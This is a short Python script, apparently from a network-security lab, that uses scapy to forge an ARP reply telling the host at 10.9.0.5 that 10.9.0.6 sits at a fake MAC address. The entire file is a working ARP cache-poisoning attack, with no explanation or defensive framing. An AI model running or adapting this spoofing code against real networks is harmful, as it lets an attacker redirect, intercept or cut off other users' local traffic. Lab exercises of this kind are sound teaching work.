#!/usr/bin/python3

from scapy.all import *



VM_A_IP = '10.9.0.5'
VM_A_MAC = getmacbyip(VM_A_IP)


# Fake IP/MAC translation
VICTIM_IP = '10.9.0.6'
FAKE_MAC = 'aa:bb:cc:dd:ee:ff'


BROADCAST_MAC = 'ff:ff:ff:ff:ff:ff'

ether = Ether(src=FAKE_MAC, dst=VM_A_MAC)
arp = ARP(hwsrc=FAKE_MAC, psrc=VICTIM_IP,hwdst=VM_A_MAC, pdst=VM_A_IP, op=2)

pkt = ether/arp
sendp(pkt, iface='eth0')
